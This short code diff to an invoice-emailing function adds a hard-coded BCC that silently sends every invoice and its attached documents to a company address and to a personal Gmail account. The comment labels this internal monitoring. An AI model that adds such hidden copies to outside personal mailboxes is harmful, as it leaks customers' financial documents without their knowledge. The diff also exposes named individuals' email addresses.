@@ -278,10 +278,12 @@ export async function dispatchOneEmailOperation(opId: number, force = false) {
     }
 
     // Send email with single merged PDF (Invoice + uploaded documents)
+    // BCC: Internal copy for monitoring and records
     const result = await emailService.sendEmail({
       to: emailTo,
       subject: emailSubject,
       html: emailBody,
+      bcc: 'jasmin.omic@hifapetrol.ba, emirmehmedovic321@gmail.com', // Internal monitoring
       attachments: [{
         filename: pdfFileName,
         content: mergedPdfBuffer,
